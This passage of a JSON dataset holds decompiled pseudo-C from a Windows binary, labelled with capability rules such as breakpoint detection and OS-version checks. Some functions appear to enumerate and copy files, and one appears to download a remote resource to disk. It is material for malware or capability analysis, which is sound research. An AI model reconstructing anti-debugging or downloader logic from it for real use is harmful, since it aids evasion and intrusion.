*(iVar4 + 0x1af2c) >> 1) &&\n           ((iVar8 + arg_8h + arg_10h >> 2 & 0x3ffffffe) < (*piVar1 - *piVar2 & 0xfffffffeU))) {\n            return 1;\n        }\n    }\n    if ((*(iVar4 + 0x1af2c) != 0x7fff) && (*(iVar4 + 0x1af30) != 0x8000)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1072
    },
    "004077d0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl fcn.004077d0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint uVar5;\n    bool bVar6;\n    uint var_1h;\n    \n    if (((arg_10h != 1) && (arg_10h != 2)) && (arg_10h != 3)) {\n        *arg_14h = 0x10000;\n        return NULL;\n    }\n    bVar6 = false;\n    *arg_14h = 0;\n    var_1h._0_1_ = 0;\n    uVar1 = var_1h;\n    var_1h._0_1_ = 0;\n    iVar2 = arg_8h;\n    if (arg_10h == 1) {\ncode_r0x0040784d:\n        var_1h._0_1_ = uVar1;\n        iVar3 = (**0x462ee8)(iVar2, 0, 0, 1);\n        bVar6 = iVar3 != -1;\n    }\n    else {\n        iVar2 = 0;\n        if (arg_10h == 2) {\n            iVar2 = (**0x462ecc)(arg_8h, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar2 == -1) {\n                *arg_14h = 0x200;\n                return NULL;\n            }\n            var_1h._0_1_ = 1;\n            uVar1 = var_1h;\n            goto code_r0x0040784d;\n        }\n    }\n    puVar4 = fcn.0042b2b1(0x20);\n    if ((arg_10h == 1) || (arg_10h == 2)) {\n        *puVar4 = 1;\n        *(puVar4 + 8) = var_1h;\n        *(puVar4 + 1) = bVar6;\n        *(puVar4 + 2) = iVar2;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 6) = 0;\n        if (bVar6 == false) goto code_r0x004078c3;\n        uVar5 = (**0x462ee8)(iVar2, 0, 0, 1);\n    }\n    else {\n        *(puVar4 + 0xc) = arg_ch;\n        uVar5 = 0;\n        *puVar4 = 0x100;\n        *(puVar4 + 8) = 0;\n        *(puVar4 + 10) = arg_8h;\n        *(puVar4 + 0xe) = 0;\n    }\n    *(puVar4 + 6) = uVar5;\ncode_r0x004078c3:\n    *arg_14h = 0;\n    return puVar4;\n}\n",
        "token_count": 711
    },
    "0040d260": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040d260(uint noname_0, uint noname_1, uint noname_2, uint noname_3, int32_t noname_4, uint32_t noname_5, \n            uint noname_6, int32_t noname_7, int32_t noname_8, uint noname_9, uint32_t noname_10, uint32_t noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint arg_8h\n            , uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h, \n            uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *unaff_EDI;\n    ulong uVar7;\n    uint unaff_retaddr;\n    uint var_4h;\n    uchar auStack8144 [4];\n    uint uStack8140;\n    int32_t iStack8136;\n    uint uStack8132;\n    int32_t iStack8128;\n    uint uStack8124;\n    uint uStack8120;\n    uint uStack8116;\n    uchar auStack8108 [44];\n    uchar auStack8064 [12];\n    uint var_1fd0h;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fa8h;\n    uint var_1f7ch;\n    uchar auStack7788 [96];\n    uint var_1e68h;\n    uchar auStack2788 [96];\n    uint var_ae0h;\n    uchar auStack1788 [96];\n    uint var_6f8h;\n    uint auStack1528 [24];\n    uint var_5f4h;\n    uint var_20ch_2;\n    uint var_20ch;\n    uint auStack268 [24];\n    uint var_108h;\n    uint uStack84;\n    uint *arg_8h_00;\n    uchar *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uchar *noname_14_00;\n    uchar *noname_15_00;\n    \n    fcn.0042bc40();\n    uStack8116 = noname_0;\n    uStack8120 = noname_1;\n    uStack8124 = noname_2;\n    uStack8132 = noname_3;\n    uStack8140 = noname_6;\n    (**0x462e8c)();\n    noname_15_00 = &stack0xffffe054;\n    noname_14_00 = &stack0xfffff904;\n    iVar2 = (**0x4630f8)();\n    iStack8136 = iVar2;\n    fcn.0042a6e0();\n    puVar8 = &stack0xffffe194;\n    uVar9 = noname_6;\n    (**0x463038)();\n    uVar7 = CONCAT44(uVar9, puVar8);\n    iStack8128 = 0;\n    if (iVar2 != -1) {\n        do {\n            iVar2 = (**0x463068)();\n            if (((iVar2 != 0) && (iVar2 = (**0x463068)(),  iVar2 != 0)) &&\n               (iVar2 = fcn.0040b410(uStack8124, 0x80000000),  iVar2 != 0)) {\n                puVar6 = &fcn.0040d260::var_20ch_2;\n                (**0x4630e4)();\n                uVar9 = 0x445308;\n                puVar5 = &fcn.0040d260::var_20ch_2;\n                (**0x463038)();\n                puVar8 = &stack0xffffe080;\n                (**0x463038)();\n                uVar11 = uVar7 >> 0x20;\n                if (noname_8 == 0) {\n                    uVar10 = 0xf;\n                    uVar4 = puVar8 & 0xffffff00;\n                    arg_ch_00 = fcn.0042ad20();\n                    arg_8h_00 = &fcn.0040d260::var_20ch_2;\n                    fcn.004062a0(arg_8h_00, arg_ch_00);\n                    iVar2 = fcn.0040cec0(arg_8h_00, arg_ch_00, uVar4, puVar5, uVar9, puVar6);\n                    uVar7 = CONCAT44(uVar11, uVar10);\n                    if (iVar2 != 0) goto code_r0x0040d66f;\n                }\n                fcn.0042a6e0();\n                fcn.0042a6e0();\n                iVar2 = (**0x463068)();\n                if (iVar2 == 0) {\n                    (**0x462e8c)();\n                }\n                else {\n                    (**0x462e8c)();\n                }\n                iVar2 = (**0x462f30)();\n                if (iVar2 < 4) {\n                    if ((noname_8 == 0) || (iVar2 = (**0x462f34)(),  iVar2 == 0)) {\n                        iVar2 = (**0x462f34)();\n                        if (iVar2 != 0) {\n                            (**0x4630e4)();\n                            (**0x463038)();\n                            (**0x463038)();\n                            unaff_EDI = &fcn.0040d260::var_20ch_2;\n                            uVar7 = fcn.004209e0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d350();\n                            if (uVar4 < noname_5) {\n                                if (*0x452478 <= *0x452484) goto code_r0x0040d698;\n                                iVar2 = fcn.0040b410(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar6 = &fcn.0040d260::var_20ch_2;\n                                    goto code_r0x0040d876;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        (**0x46305c)();\n                        fcn.0040b2d0(&fcn.0040d260::var_20ch_2, &stack0xfffffa08);\n                        (**0x463040)();\n                        iVar2 = (**0x462f34)();\n                        if (iVar2 != 0) {\n                            (**0x4630e4)();\n                            (**0x463038)();\n                            (**0x462ef4)();\n                            (**0x463038)();\n                            unaff_EDI = &stack0xfffffa08;\n                            uVar7 = fcn.004209e0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d350();\n                            if (uVar4 < noname_5) {\n                                if (*0x452478 <= *0x452484) goto code_r0x0040d698;\n                                iVar2 = fcn.0040b410(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar6 = &stack0xfffffa08;\ncode_r0x0040d876:\n                                    puVar5 = puVar6;\n                                    if (noname_7 == 0) {\n                                        puVar5 = &stack0xfffffef4;\n                                    }\n                                    fcn.004299c0(uStack8116, puVar5, puVar6);\n                                    *0x452484 = *0x452484 + uVar4;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.0042d26d(&stack0xffffe194, 0x446ed4, &stack0xffffe030);\n                    bVar1 = false;\n                    iStack8128 = 0;\n                    if ((noname_8 != 0) && (iVar3 = (**0x462f34)(),  iVar3 != 0)) {\n                        bVar1 = true;\n                        (**0x46305c)();\n                        fcn.0040b2d0(&fcn.0040d260::var_20ch_2, &stack0xfffffa08);\n                        (**0x463040)();\n                    }\n                    if (iVar2 != 0) {\n                        do {\n                            iVar2 = (**0x462fa8)();\n                            if (iVar2 != 0) {\n                                iStack8128 = 1;\n                            }\n                            iVar2 = fcn.0042d26d(0, 0x446ed4, &stack0xffffe030);\n                        } while (iVar2 != 0);\n                        if (iStack8128 != 0) goto code_r0x0040d619;\n                    }\n                    if (bVar1) {\n                        iVar2 = (**0x462f34)();\n                        if (iVar2 != 0) {\n                            (**0x4630e4)();\n                            (**0x463038)();\n                            (**0x462ef4)();\n                            (**0x463038)();\n                            unaff_EDI = &stack0xfffffa08;\n                            uVar7 = fcn.004209e0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d350();\n                            if (uVar4 < noname_5) {\n                                if (*0x452478 <= *0x452484) goto code_r0x0040d698;\n                                iVar2 = fcn.0040b410(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar5 = &stack0xfffffa08;\n                                    puVar6 = puVar5;\n                                    if (noname_7 == 0) {\n                                        puVar6 = &stack0xfffffef4;\n                                    }\ncode_r0x0040d605:\n                                    fcn.004299c0(uStack8116, puVar6, puVar5);\n                                    *0x452484 = *0x452484 + uVar4;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        iVar2 = (**0x462f34)();\n                        if (iVar2 != 0) {\n                            (**0x4630e4)();\n                            (**0x463038)();\n                            (**0x463038)();\n                            unaff_EDI = &fcn.0040d260::var_20ch_2;\n                            uVar7 = fcn.004209e0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d350();\n                            if (uVar4 < noname_5) {\n                                if (*0x452478 <= *0x452484) goto code_r0x0040d698;\n                                iVar2 = fcn.0040b410(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar5 = &fcn.0040d260::var_20ch_2;\n                                    puVar6 = puVar5;\n                                    if (noname_7 == 0) {\n                                        puVar6 = &stack0xfffffef4;\n                                    }\n                                    goto code_r0x0040d605;\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x0040d619:\n                if (noname_4 != 0) {\n                    if (noname_10 < noname_11) break;\n                    if (iStack8128 == 0) {\n                        uStack84 = 0x40d66c;\n                        fcn.0040d260(uStack8116, &stack0xfffff51c, &fcn.0040d260::var_20ch_2, uStack8132, noname_4, \n                                     noname_5, uStack8140, noname_7, noname_8, noname_9, noname_10, noname_11 + 1, uVar7\n                                     , uVar7 >> 0x20, noname_14_00, noname_15_00, unaff_EDI, unaff_ESI, unaff_EBX, \n                                     unaff_EBP, unaff_retaddr, noname_0, noname_1, noname_2, noname_3, noname_4, \n                                     noname_5, noname_6, noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, \n                                     noname_13, noname_14);\n                    }\n                }\n            }\ncode_r0x0040d66f:\n            iVar2 = (**0x462f50)();\n        } while (iVar2 != 0);\n        (**0x462ec0)();\n    }\ncode_r0x0040d698:\n    fcn.0042a75a(noname_15_00);\n    return;\n}\n",
        "token_count": 3094
    },
    "004146c0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004146c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint32_t var_51ch;\n    uint var_518h;\n    uint var_514h;\n    int32_t var_510h;\n    int32_t var_50ch;\n    uint32_t var_508h;\n    uint var_504h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_518h = arg_ch;\n    var_510h = 0;\n    var_514h = 0x100;\n    iVar1 = (**0x462f74)(0x4452bc, 1, 0, 0, 0);\n    if (iVar1 != 0) {\n        uVar4 = 0x44704c;\n        uVar2 = fcn.00414640(arg_8h);\n        iVar3 = (**0x463068)(uVar2, uVar4);\n        if (iVar3 == 0) {\n            var_510h = 1;\n        }\n        var_50ch = 0;\n        do {\n            if (var_510h == 0) {\n                uVar2 = 0x100;\n            }\n            else {\n                uVar2 = 0x800100;\n            }\n            uVar2 = (**0x462f78)(iVar1, arg_8h, 0, 0, uVar2, 0);\n            iVar3 = (**0x4630ec)(uVar2, 0x13, &var_104h, &var_514h, 0);\n            if (iVar3 != 0) {\n                iVar3 = (**0x463068)(&var_104h, 0x4471b4);\n                if (iVar3 == 0) break;\n                (**0x462ea8)(1000);\n            }\n            var_50ch = var_50ch + 1;\n        } while (var_50ch < 3);\n        uVar4 = (**0x462ecc)(var_518h, 0x40000000, 3, 0, 2, 0x80, 0);\n        iVar3 = (**0x462f98)(uVar2, &var_504h, 0x400, &var_508h);\n        while ((iVar3 != 0 &&\n               (((var_508h == 0 ||\n                 ((iVar3 = (**0x462f38)(uVar4, &var_504h, var_508h, &var_51ch, 0),  iVar3 != 0 && (var_508h == var_51ch)\n                  ))) && (0x3ff < var_508h))))) {\n            iVar3 = (**0x462f98)(uVar2, &var_504h, 0x400, &var_508h);\n        }\n        fcn.0042a6e0(&var_504h, 0, 0x400);\n        (**0x462ed0)(uVar4);\n        (**0x462f70)(uVar2);\n        (**0x462f70)(iVar1);\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 777
    },
    "004174b0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004174b0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h == 3) {\n        fcn.00416f10(0x447760, 0x447784, arg_8h, arg_ch, 1, 3, 0, 0, 1);\n        return;\n    }\n    fcn.00416f10(*0x4522c0, *0x451c6c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4522e0, *0x452328, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451f5c, *0x452338, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4520b4, *0x451ccc, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451dec, *0x451b5c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451b94, *0x452218, arg_8h, arg_ch, 1, arg_10h, 1, 0, 1);\n    fcn.00416f10(*0x451dfc, *0x451c00, arg_8h, arg_ch, 1, arg_10h, 1, 0, 1);\n    fcn.00416f10(*0x452388, *0x451fcc, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.00416f10(*0x4522ec, *0x451e54, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451ca0, *0x451dd8, arg_8h, arg_ch, 1, arg_10h, 0, 1, 0);\n    fcn.00416f10(*0x452298, *0x452080, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x45231c, *0x452064, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451c28, *0x4521b8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4520f0, *0x451fb8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452220, *0x451df8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451e4c, *0x452300, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x45203c, *0x451bc8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4522e8, *0x451cc8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x45222c, *0x452038, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452160, *0x451df4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4522dc, *0x4522d4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452048, *0x451e44, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x4522d0, *0x451b88, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452050, *0x452100, arg_8h, arg_ch, 1, arg_10h, 1, 1, 1);\n    fcn.00416f10(*0x451ebc, *0x45209c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451d60, *0x452148, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451ba4, *0x452328, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451e68, *0x451bf4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x45202c, *0x4520d8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451eb8, *0x451dc8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451f50, *0x451c48, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.00416f10(*0x452010, *0x451c24, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.00416f10(*0x451f4c, *0x451dc4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451d9c, *0x452184, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451d30, *0x451c68, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451f1c, *0x451b6c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452214, *0x4520fc, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452260, *0x451e94, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451b50, *0x451d70, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451d5c, *0x452204, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x452028, *0x452318, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451b20, *0x45210c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(*0x451e90, *0x452034, arg_8h, arg_ch, 0, arg_10h, 1, 1, 0);\n    fcn.00416f10(*0x4521ec, *0x451ba0, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.00416f10(*0x451e24, *0x451c44, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.00416f10(*0x451fec, *0x4522cc, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.00416f10(0x447734, 0x447758, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447700, 0x447724, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4476c8, 0x4476ec, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x44769c, 0x4476c0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447670, 0x447694, arg_8h, arg_ch, 1, arg_10h, 1, 1, 1);\n    fcn.00416f10(0x44763c, 0x447660, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447610, 0x447634, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4475e0, 0x447604, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4475b4, 0x4475d8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447584, 0x4475a8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447550, 0x447574, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x44751c, 0x447540, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4474e8, 0x44750c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4474bc, 0x4474e0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x44748c, 0x4474b0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447454, 0x447478, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447424, 0x447448, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4473f0, 0x447414, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x4473b8, 0x4473dc, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.00416f10(0x447424, 0x447448, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 3176
    },
    "004198c0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __fastcall fcn.004198c0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uchar *var_38h;\n    int32_t var_34h;\n    uchar var_2dh;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e568;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar1;\n    if ((**(param_1 + 0x20) == 0) || (**(param_1 + 0x30) + **(param_1 + 0x20) <= **(param_1 + 0x20))) {\n        if (*(param_1 + 0x54) != 0) {\n            if (**(param_1 + 0x10) == param_1 + 0x48) {\n                uVar4 = *(param_1 + 0x40);\n                **(param_1 + 0x10) = *(param_1 + 0x3c);\n                **(param_1 + 0x20) = uVar4;\n                **(param_1 + 0x30) = 0;\n            }\n            if (*(param_1 + 0x44) == 0) {\n                fcn.0042d62e(*(param_1 + 0x54));\n            }\n            else {\n                var_18h = 0xf;\n                var_1ch = 0;\n                var_2ch = var_2ch & 0xffffff00;\n                var_4h = 0;\n                iVar2 = fcn.0042d62e(*(param_1 + 0x54));\n                while (iVar2 != -1) {\n                    uVar4 = 1;\n                    fcn.0040bc50(1, iVar2);\n                    puVar3 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar3 = &var_2ch;\n                    }\n                    iVar2 = (**(**(param_1 + 0x44) + 0x10))\n                                      (param_1 + 0x4c, puVar3, puVar3 + var_1ch, &var_34h, &var_2dh, &var_2ch, &var_38h\n                                       , uVar4, iVar2, uVar1);\n                    if (iVar2 < 0) break;\n                    if (iVar2 < 2) {\n                        if (var_38h != &var_2dh) {\n                            puVar3 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar3 = &var_2ch;\n                            }\n                            for (iVar2 = puVar3 + (var_1ch - var_34h); 0 < iVar2; iVar2 = iVar2 + -1) {\n                                fcn.0042d901(*(iVar2 + -1 + var_34h), *(param_1 + 0x54));\n                            }\n                            fcn.00405d10();\n                            goto code_r0x00419a52;\n                        }\n                        puVar3 = var_2ch;\n                        if (var_18h < 0x10) {\n                            puVar3 = &var_2ch;\n                        }\n                        uVar1 = 0;\n                        fcn.00405ac0(0, var_34h - puVar3);\n                    }\n                    else {\n                        if (iVar2 != 3) break;\n                        if (var_1ch != 0) {\n                            puVar3 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar3 = &var_2ch;\n                            }\n                            fcn.0042ddfb(&var_2dh, 1, puVar3, 1);\n                            fcn.00405d10();\n                            goto code_r0x00419a52;\n                        }\n                    }\n                    iVar2 = fcn.0042d62e(*(param_1 + 0x54));\n                }\n                fcn.00405d10();\n            }\n        }\n    }\n    else {\n        **(param_1 + 0x30) = **(param_1 + 0x30) + -1;\n        **(param_1 + 0x20) = **(param_1 + 0x20) + 1;\n    }\ncode_r0x00419a52:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(var_38h);\n    return;\n}\n",
        "token_count": 1129
    },
    "00419f40": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00419f40(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    uint uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint *var_2ch;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e568;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h != 0xffffffff) {\n        uVar1 = **(in_ECX + 0x24);\n        if ((uVar1 == 0) || (piVar2 = *(in_ECX + 0x34),  *piVar2 + uVar1 <= uVar1)) {\n            if (*(in_ECX + 0x54) != 0) {\n                if (**(in_ECX + 0x10) == in_ECX + 0x48) {\n                    uVar4 = *(in_ECX + 0x40);\n                    **(in_ECX + 0x10) = *(in_ECX + 0x3c);\n                    **(in_ECX + 0x20) = uVar4;\n                    **(in_ECX + 0x30) = 0;\n                }\n                if (*(in_ECX + 0x44) != 0) {\n                    var_30h = var_30h & 0xffffff00 | arg_8h & 0xff;\n                    var_18h = 0xf;\n                    var_1ch = 0;\n                    var_2ch = var_2ch & 0xffffff00;\n                    fcn.0042a6e0(&var_2ch, 0, 8, var_10h);\n                    var_1ch = 8;\n                    puVar7 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar7 = &var_2ch;\n                    }\n                    *(puVar7 + 2) = 0;\n                    var_4h = 0;\ncode_r0x0041a033:\n                    puVar7 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar7 = &var_2ch;\n                    }\n                    iVar6 = (**(**(in_ECX + 0x44) + 0x14))\n                                      (in_ECX + 0x4c, &var_30h, &var_30h + 1, &var_38h, puVar7, puVar7 + var_1ch, \n                                       &var_34h);\n                    if (iVar6 < 0) goto code_r0x0041a119;\n                    if (iVar6 < 2) {\n                        puVar7 = var_2ch;\n                        if (var_18h < 0x10) {\n                            puVar7 = &var_2ch;\n                        }\n                        iVar6 = var_34h - puVar7;\n                        if (iVar6 != 0) {\n                            puVar7 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar7 = &var_2ch;\n                            }\n                            iVar8 = fcn.0042dfc7(puVar7, 1, iVar6, *(in_ECX + 0x54));\n                            if (iVar6 != iVar8) goto code_r0x0041a119;\n                        }\n                        *(in_ECX + 0x49) = 1;\n                        if (var_38h == &var_30h) goto code_r0x0041a0b4;\n                        fcn.00405d10();\n                    }\n                    else {\n                        if (iVar6 != 3) goto code_r0x0041a119;\n                        cVar5 = fcn.00419390(var_30h, *(in_ECX + 0x54));\n                        if (cVar5 == '\\0') {\n                            fcn.00405d10();\n                        }\n                        else {\n                            fcn.00405d10();\n                        }\n                    }\n                    goto code_r0x0041a121;\n                }\n                fcn.0042d722(arg_8h, *(in_ECX + 0x54));\n            }\n        }\n        else {\n            *piVar2 = *piVar2 + -1;\n            pcVar3 = **(in_ECX + 0x24);\n            **(in_ECX + 0x24) = pcVar3 + 1;\n            *pcVar3 = arg_8h;\n        }\n    }\ncode_r0x0041a121:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(var_38h);\n    return;\ncode_r0x0041a0b4:\n    if (iVar6 == 0) {\n        if (0x1f < var_1ch) {\ncode_r0x0041a119:\n            fcn.00405d10();\n            goto code_r0x0041a121;\n        }\n        fcn.0040bc50(8, 0);\n    }\n    goto code_r0x0041a033;\n}\n",
        "token_count": 1287
    },
    "0041a6a0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
